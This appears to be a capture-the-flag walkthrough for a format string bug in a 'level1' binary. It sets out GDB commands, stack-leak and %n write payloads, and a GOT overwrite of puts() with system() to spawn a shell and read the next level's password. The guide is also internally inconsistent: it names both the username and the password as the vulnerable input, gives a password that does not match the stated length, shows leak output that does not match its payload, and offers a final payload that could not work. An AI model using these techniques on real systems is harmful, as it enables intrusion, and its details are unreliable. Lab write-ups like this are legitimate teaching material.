# Level1 Format String Exploit Guide

## Vulnerability Analysis

### The Bug
```assembly
0x0804850b <+59>:	call   0x8048360 <printf@plt>   # printf(username_buffer)
```
- `printf()` called with user input directly
- No format string specified
- User input interpreted as format string

### Memory Layout
- Username buffer: `0x804a040` (global)
- Password buffer: `%esp + 0x1c` (local stack)
- Expected username: `0x80486a8` (7 bytes)
- Expected password: `0x80486b0` (5 bytes)

## Step 1: Extract Hardcoded Strings

### Using GDB
```bash
gdb ./level1
(gdb) x/s 0x80486a8
# Expected username: "dat_wil"

(gdb) x/s 0x80486b0  
# Expected password: "P@ssw0rd"
```

## Step 2: Format String Payload Development

### Basic Format String Test
```bash
./level1
# Username: %x%x%x%x
# Password: anything
```

### Memory Leak Payload
```bash
# Username: %08x.%08x.%08x.%08x
# This will leak 4 stack values
```

### Finding Our Input on Stack
```bash
# Username: AAAA.%08x.%08x.%08x.%08x.%08x.%08x
# Look for 0x41414141 (AAAA) in output
```

## Step 3: GOT Overwrite Strategy

### Target: system() GOT Entry
```bash
# Find system() GOT address
(gdb) info functions system
# Or: (gdb) x/1x 0x8048380

# Find puts() GOT address (easier to overwrite)
(gdb) info functions puts
```

### Overwrite Strategy
1. **Find puts() GOT address**
2. **Overwrite puts() GOT with system() address**
3. **Trigger puts() with "/bin/sh" string**

## Step 4: Exploit Development

### Step 4.1: Find Stack Offset
```bash
# Username: AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
# Count how many %x until you see 0x41414141
```

### Step 4.2: Direct Parameter Access
```bash
# Username: %7$x
# This directly accesses the 7th parameter
```

### Step 4.3: Write to Memory
```bash
# Username: %7$n
# This writes the number of characters printed to the 7th parameter
```

## Step 5: Complete Exploit

### Method 1: GOT Overwrite
```bash
# 1. Find puts() GOT address
# 2. Overwrite with system() address
# 3. Trigger puts("/bin/sh")

# Username: <puts_got_addr>%7$n
# Password: /bin/sh
```

### Method 2: Return Address Overwrite
```bash
# 1. Find return address on stack
# 2. Overwrite with shellcode address
# 3. Execute shellcode
```

## Step 6: Shellcode Alternative

### Using system() Call
```bash
# Instead of shellcode, use existing system() function
# Overwrite GOT entry to point to system()
# Then trigger with "/bin/sh" string
```

## Testing the Exploit

### Step 1: Basic Test
```bash
./level1
# Username: dat_wil
# Password: %x%x%x%x
```

### Step 2: Memory Leak
```bash
./level1
# Username: dat_wil
# Password: %08x.%08x.%08x.%08x.%08x.%08x
```

### Step 3: Find Stack Position
```bash
./level1
# Username: dat_wil
# Password: AAAA.%08x.%08x.%08x.%08x.%08x.%08x
# Look for 0x41414141 in output
```

## Expected Results

### Memory Leak Output
```
********* ADMIN LOGIN PROMPT *********
Enter Username:dat_wil
verifying username....

Enter Password: %08x.%08x.%08x.%08x
080485a3.00000000.080485a3.00000000.080485a3.00000000
```

### Exploit Success
```
********* ADMIN LOGIN PROMPT *********
Enter Username:dat_wil
verifying username....

Enter Password: <exploit_payload>
$ cat /home/users/level02/.pass
<level02_password>
```

## Key Points

1. **Username must be correct**: "dat_wil"
2. **Password field is vulnerable**: Format string in password input
3. **Stack layout matters**: Need to find correct offset
4. **GOT overwrite**: More reliable than shellcode
5. **system() function**: Already available in program

## Next Steps

1. Extract hardcoded strings
2. Find stack offset for password buffer
3. Develop format string payload
4. Overwrite GOT or return address
5. Gain shell access
6. Read level02 password 